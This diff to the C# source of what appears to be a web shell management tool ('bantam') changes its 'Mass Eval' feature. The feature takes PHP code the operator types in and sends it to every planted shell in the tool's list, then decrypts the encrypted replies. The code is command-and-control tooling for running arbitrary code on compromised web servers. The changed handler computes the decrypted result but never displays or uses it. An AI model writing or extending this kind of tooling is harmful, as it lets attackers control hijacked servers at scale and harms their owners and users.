@@ -257,17 +257,26 @@ namespace bantam
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private void evalToolStripMenuItem1_Click(object sender, EventArgs e)
+        private async void evalToolStripMenuItem1_Click(object sender, EventArgs e)
         {
             bool bShow = false;
             string code = GuiHelper.RichTextBoxEvalEditor("PHP Eval Editor - Mass Eval", string.Empty, ref bShow);
+
+            RichTextBox rtb = GuiHelper.RichTextBoxDialog("Mass Eval", string.Empty);
 
             foreach (ListViewItem lvClients in listViewShells.Items) {
                 string shellUrl = lvClients.Text;
                 if (Shells.ContainsKey(shellUrl)) {
                     bool encryptResponse = Shells[shellUrl].responseEncryption;
-                    WebHelper.ExecuteRemotePHP(shellUrl, code, encryptResponse);
-                    //todo show/track responses
+                    ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, code, encryptResponse);
+
+
+                    if (string.IsNullOrEmpty(response.Result) == false) {
+                        string result = response.Result;
+                        if (encryptResponse) {
+                            result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, responseEncryptionMode);
+                        }
+                    }
                 }
             }
         }
